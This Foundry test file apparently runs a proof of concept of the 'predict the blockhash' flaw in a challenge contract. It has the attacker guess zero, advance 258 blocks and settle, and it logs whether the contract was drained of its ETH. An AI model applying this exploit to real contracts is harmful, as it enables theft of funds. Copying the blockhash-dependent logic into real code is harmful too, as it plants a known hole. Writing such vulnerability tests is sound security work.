// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/old_blockhash.sol";

contract PredictTheBlockHashChallengeTest is Test {
    PredictTheBlockHashChallenge challenge;
    address attacker;
    
    function setUp() public {
        // Create attacker address
        attacker = makeAddr("attacker");
        
        // Deploy challenge contract with 1 ETH
        challenge = new PredictTheBlockHashChallenge{value: 1 ether}();
        
        // Fund attacker with 1 ETH for the game
        vm.deal(attacker, 1 ether);
    }

    function testBlockhashPredictability() public {
        // Record initial states
        uint256 startingContractBalance = address(challenge).balance;
        uint256 attackerStartingBalance = attacker.balance;
        console.log("--- BEFORE-Trigger State ---");
        console.log("Starting Contract Balance: %s", startingContractBalance);
        console.log("Attacker Starting Balance: %s", attackerStartingBalance);

        console.log("--- Trigger Attacker Actions ---");
        // Attacker locks in guess (0x0) with 1 ETH
        vm.prank(attacker);
        challenge.lockInGuess{value: 1 ether}(bytes32(0));
        
        // Advance 258 blocks to make target block unavailable
        vm.roll(block.number + 258);
        
        // Attacker settles to win
        vm.prank(attacker);
        challenge.settle();
        
        console.log("--- AFTER-Trigger State ---");
        // Capture post-trigger states
        uint256 finalContractBalance = address(challenge).balance;
        uint256 finalAttackerBalance = attacker.balance;
        
        console.log("Final Contract Balance: %s", finalContractBalance);
        console.log("Final Attacker Balance: %s", finalAttackerBalance);
        
        // Vulnerability validation through state comparison
        bool contractDrained = finalContractBalance == 0;
        bool attackerProfited = finalAttackerBalance == attackerStartingBalance + 1 ether;
        
        console.log("--- Exploit Evaluation ---");
        console.log("Contract fully drained:", contractDrained ? "YES" : "NO");
        console.log("Attacker gained 1 ETH:", attackerProfited ? "YES" : "NO");
        
        // Final exploit verdict
        if (contractDrained && attackerProfited) {
            console.log("Vulnerability Exists: Attacker successfully exploited blockhash predictability to drain contract");
        } else {
            console.log("Vulnerability not Exist: Exploit attempt failed to produce expected state changes");
        }
    }
}